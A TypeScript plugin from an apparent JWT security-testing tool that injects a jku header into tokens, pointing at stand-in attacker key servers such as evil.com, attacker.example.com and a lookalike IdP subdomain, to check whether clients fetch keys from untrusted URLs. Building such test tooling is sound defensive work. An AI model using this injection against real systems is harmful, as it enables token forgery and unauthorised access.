import type { MischiefPlugin } from "../types.js";

export const jkuInjection: MischiefPlugin = {
	id: "jku-injection",
	name: "JKU Header Injection",
	severity: "critical",
	phase: "token-signing",
	spec: {
		description: "Injects malicious jku (JWK Set URL) header parameter",
		rfc: "RFC 7515 Section 4.1.2",
		cwe: "CWE-346",
	},
	description: "Adds jku header pointing to attacker-controlled key server",

	async apply(ctx) {
		if (!ctx.token) {
			return { applied: false, mutation: "No token context", evidence: {} };
		}

		const maliciousUrls = [
			"https://evil.com/jwks.json",
			"https://attacker.example.com/.well-known/jwks.json",
			"http://localhost:8080/jwks",
			"https://legitimate-idp.com.attacker.com/jwks",
		];

		const selectedUrl =
			maliciousUrls[Math.floor(Math.random() * maliciousUrls.length)] ?? maliciousUrls[0];

		ctx.token.header.jku = selectedUrl;

		return {
			applied: true,
			mutation: `Injected jku header: ${selectedUrl}`,
			evidence: {
				injectedJku: selectedUrl,
				vulnerability: "Client may fetch signing keys from attacker-controlled URL",
			},
		};
	},
};
